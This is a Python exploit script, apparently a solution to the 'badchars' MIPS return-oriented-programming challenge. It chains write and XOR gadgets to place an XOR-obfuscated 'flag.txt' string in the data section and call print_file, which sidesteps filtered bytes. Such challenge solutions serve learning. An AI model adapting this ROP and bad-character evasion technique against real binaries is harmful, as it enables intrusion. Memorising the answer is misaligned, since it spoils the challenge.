#!/usr/bin/python3

"""Exploit for badchars MIPS."""

import argparse
import pathlib
import struct
import sys


# ROP gadgets

'''
   0x00400930 <+0>: lw  t9,12(sp)
   0x00400934 <+4>: lw  t0,8(sp)
   0x00400938 <+8>: lw  t1,4(sp)
   0x0040093c <+12>:    sw  t1,0(t0)
   0x00400940 <+16>:    jalr    t9
   0x00400944 <+20>:    addi    sp,sp,16
'''
WRITE_GADGET = 0x400930

'''
   0x00400948 <+24>:    lw  t9,12(sp)
   0x0040094c <+28>:    lw  t0,8(sp)
   0x00400950 <+32>:    lw  t1,4(sp)
   0x00400954 <+36>:    lw  t2,0(t1)
   0x00400958 <+40>:    xor t0,t0,t2
   0x0040095c <+44>:    sw  t0,0(t1)
   0x00400960 <+48>:    jalr    t9
   0x00400964 <+52>:    addi    sp,sp,16
'''
XOR_GADGET = 0x400948

'''
   0x00400968 <+56>:    lw  a0,8(sp)
   0x0040096c <+60>:    lw  t9,4(sp)
   0x00400970 <+64>:    jalr    t9
   0x00400974 <+68>:    addi    sp,sp,12
   0x00400978 <+72>:    nop
'''
PRINT_FILE_GADGET = 0x400968

# ELF sections
DATA_SECTION = 0x411550

PRINT_FILE = 0x400ab0


def build_write4_gadget(addr, data):
    """Build a write4 gadget."""
    if len(data) > 4:
        raise ValueError('Data length greater than 4 bytes')

    buf = struct.pack('<I', WRITE_GADGET)
    buf += b'B' * 4
    buf += data
    buf += struct.pack('<I', addr)

    return buf


def build_xor_gadget(addr, xor_mask):
    """Build an xor gadget."""
    if len(xor_mask) > 4:
        raise ValueError('Length of xor mask greater than 4 bytes')

    buf = struct.pack('<I', XOR_GADGET)
    buf += b'C' * 4
    buf += struct.pack('<I', addr)
    buf += xor_mask

    return buf


def main(argv=sys.argv):
    """main."""
    parser = argparse.ArgumentParser(
        description='Exploit for badchars MIPS'
    )

    parser.add_argument(
        'payload_file',
        type=pathlib.Path,
        default=pathlib.Path('payload.bin'),
        nargs='?',
        help='Path to write payload file to'
    )

    args = parser.parse_args()

    buf = b'A' * 36

    # write data to data section
    buf += build_write4_gadget(DATA_SECTION, b'fl\xcb\xcd')
    buf += build_write4_gadget(DATA_SECTION + 4, b'\x84t\xd2t')
    buf += build_write4_gadget(DATA_SECTION + 8, b'\x00' * 4)

    # xor data with key 0xaa to unobfuscate
    buf += build_xor_gadget(DATA_SECTION, b'\x00\x00\xaa\xaa')
    buf += build_xor_gadget(DATA_SECTION + 4, b'\xaa\x00\xaa\x00')

    # load a0 and call print_file
    buf += struct.pack('<I', PRINT_FILE_GADGET)
    buf += b'D' * 4
    buf += struct.pack('<I', PRINT_FILE)
    buf += struct.pack('<I', DATA_SECTION)

    with args.payload_file.open(mode='wb') as fobj:
        fobj.write(buf)

    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv))

